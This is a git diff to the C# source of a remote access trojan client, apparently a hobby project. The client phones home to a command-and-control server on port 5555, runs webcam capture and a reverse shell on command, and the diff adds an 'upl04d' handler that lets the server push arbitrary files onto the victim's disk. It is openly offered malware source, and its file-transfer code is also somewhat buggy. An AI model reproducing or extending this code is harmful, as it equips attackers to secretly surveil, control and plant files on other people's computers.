@@ -22,6 +22,7 @@ namespace RATClient
         static IPEndPoint CCServ = new IPEndPoint(CCIP, 5555);
         static Boolean connected = false;
         static Socket openSock;
+        static byte[] genericRecieve = Encoding.ASCII.GetBytes("♦");
         static void phoneHome()
         {
             Console.WriteLine("Contacting C&C...");
@@ -111,10 +112,66 @@ namespace RATClient
             }else if (recvString.StartsWith("c4m"))
             {
                 captureWebcam();
+            }else if (recvString.StartsWith("upl04d"))
+            {
+                recieveFile();
             }
         }
 
+        static void recieveFile()
+        {
+            openSock.Send(genericRecieve);
 
+            //Deal with file size
+            byte[] fileSizeBytes = new byte[64];
+            int fileSizeDigits = openSock.Receive(fileSizeBytes);//Recieve size of file
+            openSock.Send(genericRecieve);
+            String fileSizeString = Encoding.ASCII.GetString(fileSizeBytes, 0, fileSizeDigits);
+            long fileSize = long.Parse(fileSizeString);
+            //Done dealing with file size
+
+            //Deal with file name
+            byte[] fileNameBytes = new byte[128];
+            int fileNameCharacters = openSock.Receive(fileNameBytes);//Recieve Name
+            openSock.Send(genericRecieve);
+            String fileName = Encoding.ASCII.GetString(fileNameBytes, 0, fileNameCharacters);
+            Console.WriteLine("Recieved file name " + fileName);
+            //Done with that, too
+
+            FileStream f = File.Open(fileName, FileMode.OpenOrCreate);
+
+            //Now, deal with reception of file.
+
+            byte[] terminator = Encoding.ASCII.GetBytes("♦♦endOfFile♦♦");
+            List<byte> fileBytesList = new List<byte>();
+            byte[] fileBytesArray = new byte[1024];//store a kilobyte of file at a time
+            while (true)
+            {
+                int recievedByteCount = openSock.Receive(fileBytesArray);//recieve into fileBytesArray
+                openSock.Send(genericRecieve); //ACK the chunk
+                String recievedBytes = Encoding.ASCII.GetString(fileBytesArray, 0, recievedByteCount);
+                if (recievedByteCount < 1024 || recievedBytes.Contains("♦♦endOfFile♦♦"))//if we see a fishy packet/one that contains the end of file identifier...
+                {
+                    Console.WriteLine("END OF FILE REACHED"); //DEBUGSTATEMENT
+                    for (int i = 0; i < recievedByteCount; i++)
+                    {
+                        fileBytesList.Add(fileBytesArray[i]);//Should only add until recievedBytes, which is ideally less than 1024
+                    }
+                    break;
+                }
+                for (int i = 0; i < recievedByteCount; i++)
+                {
+                    fileBytesList.Add(fileBytesArray[i]);//Adds all 1024 bytes
+                }
+            }
+            foreach(byte b in terminator)
+            {
+                fileBytesList.RemoveAt(fileBytesList.ToArray().Length-1); //Remove the file terminator from the file
+            }
+            openSock.Send(genericRecieve); //Sends final confirmation
+            f.Write(fileBytesList.ToArray(), 0, ((int)fileSize - terminator.Length));//write out the file
+            f.Close();
+        }
         static void reverseShell()
         {
             Console.WriteLine("Spinning up reverse shell...");
@@ -259,13 +316,9 @@ namespace RATClient
         }
         static void Main(string[] args)
         {
-            while (true)
-            {
                 Thread t = new Thread(phoneHome);
                 t.Start();
                 Console.ReadLine();
-            }
-            
         }
     }
 }
